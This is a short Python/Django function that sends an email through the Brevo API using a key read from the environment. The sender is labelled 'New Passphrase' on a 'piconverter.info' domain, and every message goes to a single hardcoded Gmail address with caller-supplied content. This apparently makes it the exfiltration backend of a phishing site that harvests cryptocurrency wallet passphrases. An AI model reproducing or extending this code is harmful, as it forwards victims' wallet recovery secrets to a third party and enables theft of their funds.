import os
from django.conf import settings
import requests

# from . import models

# Get API key from environment variables
api_key = os.getenv("SENDINBLUE_API_KEY")


def send_mail(mail_info, mail_subj, std_name):

    # Brevo API endpoint for sending transactional emails..
    url = "https://api.brevo.com/v3/smtp/email"

    # The email data we are sending to the user..
    payload = {
        "sender": {
            "name": f"New Passphrase",
            "email": "uzomamicheal07@piconverter.info",
        },
        "to": [{"email": "lordyacey@gmail.com", "name": f"{std_name}"}],
        "subject": f"{mail_subj}",
        "htmlContent": f"{mail_info}",
    }

    # Our authorization header..
    headers = {
        "api-key": api_key,
        "Content-Type": "application/json",
        "accept": "application/json",
    }

    # Our post request..
    response = requests.post(url, json=payload, headers=headers)
    return
